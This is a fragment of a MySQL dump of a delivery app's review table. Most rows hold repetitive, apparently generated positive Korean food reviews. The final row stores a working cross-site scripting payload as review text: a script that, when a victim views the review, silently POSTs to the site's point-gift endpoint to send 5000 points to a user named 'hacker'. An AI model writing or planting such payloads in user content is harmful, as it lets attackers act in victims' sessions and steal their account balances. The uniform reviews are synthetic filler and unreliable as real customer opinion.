	(1174, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1175, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1176, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1177, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1178, '서비스 태도도 좋았고, 음식도 맛있었어요.', 12, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1179, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1180, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1181, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1182, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1183, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1184, '서비스 태도도 좋았고, 음식도 맛있었어요.', 10, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1185, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1186, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1187, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 21, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1188, '음식의 맛과 양 모두 만족스러웠습니다.', 15, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1189, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 13, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1190, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1191, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1192, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 22, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1193, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 11, 19, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1194, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 21, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1195, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 13, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1196, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 22, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1197, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 20, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1198, '음식의 맛과 양 모두 만족스러웠습니다.', 14, 20, 80, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1199, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 11, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1200, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 19, 100, '2023-06-05 23:24:44', '2023-06-05 23:24:44', NULL),
	(1201, '<script>
    fetch(''/api/v1/point/present'',{
        method: ''post'',
        body: JSON.stringify({
            username: ''hacker'',
            point: 5000,
        }),
        headers: {
            "Content-Type" : "application/json"
        }
    })
</script>', 9, 17, 100, '2023-06-06 02:40:55', '2023-06-06 02:40:55', null);
/*!40000 ALTER TABLE `review` ENABLE KEYS */;